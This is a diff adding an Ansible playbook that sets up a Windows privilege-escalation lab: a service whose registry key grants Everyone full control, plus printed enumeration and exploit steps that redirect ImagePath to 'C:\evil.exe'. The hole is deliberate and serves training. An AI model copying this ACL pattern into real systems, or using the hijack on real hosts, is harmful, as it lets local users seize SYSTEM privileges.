@@ -1,0 +1,53 @@
+---
+# Weak Service Registry Permissions Lab Setup
+# Creates a service whose HKLM registry key grants Everyone write access.
+# The victim can modify the ImagePath and point it to a malicious binary.
+#
+# Reference: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/WeakRegistryPermissions.md
+
+- name: Create placeholder binary directory for WeakRegSvc
+  ansible.windows.win_file:
+    path: "C:\\Services\\WeakRegistry"
+    state: directory
+
+- name: Copy placeholder binary for WeakRegSvc (skip if already exists)
+  ansible.windows.win_shell: |
+    $dest = "C:\Services\WeakRegistry\WeakRegSvc.exe"
+    if (-not (Test-Path $dest)) {
+      Copy-Item "C:\Windows\System32\cmd.exe" $dest -Force
+    }
+
+- name: Create WeakRegSvc service
+  ansible.windows.win_shell: |
+    $svcName = "WeakRegSvc"
+    if (Get-Service -Name $svcName -ErrorAction SilentlyContinue) {
+      Stop-Service $svcName -Force -ErrorAction SilentlyContinue
+      & sc.exe delete $svcName | Out-Null
+      Start-Sleep -Seconds 2
+    }
+    & sc.exe create $svcName `
+      binPath= "C:\Services\WeakRegistry\WeakRegSvc.exe" `
+      DisplayName= "Weak Registry Permissions Demo" `
+      start= auto | Out-Null
+
+- name: Grant Everyone full control on the service registry key
+  ansible.windows.win_shell: |
+    $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\WeakRegSvc"
+    $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+      "Everyone",
+      "FullControl",
+      "ContainerInherit,ObjectInherit",
+      "None",
+      "Allow"
+    )
+    $acl.AddAccessRule($rule)
+    Set-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\WeakRegSvc" $acl
+
+- name: Print Weak Service Registry scenario info
+  ansible.builtin.debug:
+    msg:
+      - "=== Weak Service Registry Permissions Scenario ==="
+      - "Reg key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\WeakRegSvc (Everyone:F)"
+      - "Enumerate: Get-Acl HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WeakRegSvc | Format-List"
+      - "Exploit: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WeakRegSvc /v ImagePath /t REG_EXPAND_SZ /d C:\\evil.exe /f"
+      - "Then: sc stop WeakRegSvc && sc start WeakRegSvc"
